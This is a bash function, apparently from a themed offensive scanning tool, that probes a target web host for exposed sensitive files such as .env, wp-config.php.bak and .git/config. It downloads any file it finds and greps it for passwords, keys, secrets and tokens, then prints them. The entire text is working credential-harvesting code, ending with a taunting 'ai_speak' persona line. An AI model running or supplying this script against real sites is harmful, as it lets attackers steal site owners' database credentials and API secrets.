#!/bin/bash

run_leak_extractor() {
    local target=$1
    local host_target="${target}"

    if [ -n "${STATE[target_domain]}" ]; then
        host_target="${STATE[target_domain]}"
    fi

    local sensitive_files=(
        ".env"
        "config.php.bak"
        "wp-config.php.bak"
        "database.yml"
        "credentials.txt"
        ".git/config"
    )

    echo -e "\n${TXT_DRK_RED}============================================================${NC}"
    echo -e "${TXT_PULSE_RED}[///] MX:// REALLOCATING SYSTEM MEMORY FOR LEAK ANALYSIS...${NC}"
    echo -e "${TXT_DRK_RED}============================================================${NC}\n"

    local leaks_found=0

    for file in "${sensitive_files[@]}"; do
        local url="http://${host_target}/${file}"
        local status=$(curl -s -o /dev/null -w "%{http_code}" "$url")

        if [ "$status" == "200" ]; then
            echo -e "${TXT_SCARLET}[ ++ ] LEAK DETECTED:${NC} ${TXT_NEON}/${file}${NC} (HTTP 200)"
            ((leaks_found++))

            local tmp_file="/tmp/leak_$$"
            curl -s "$url" -o "$tmp_file"

            echo -e "${TXT_MID_RED}[ i ] Extracting potential credentials...${NC}"
            local creds=$(grep -Ei 'pass|key|secret|token|user|db_' "$tmp_file" 2>/dev/null)

            if [ -n "$creds" ]; then
                echo "$creds" | while read -r line; do
                    echo -e "  ${TXT_CORE}-> ${line#* }${NC}"
                done
            else
                echo -e "  ${TXT_DRK_RED}[~] No clear text patterns found. Manual analysis required: ${url}${NC}"
            fi

            rm -f "$tmp_file"
            echo ""
        fi
    done

    if (( leaks_found == 0 )); then
        ai_speak "No obvious data leaks detected on primary web vectors."
        echo ""
    else
        ai_speak "Who benefit the most? You... or her?"
        echo ""
    fi
}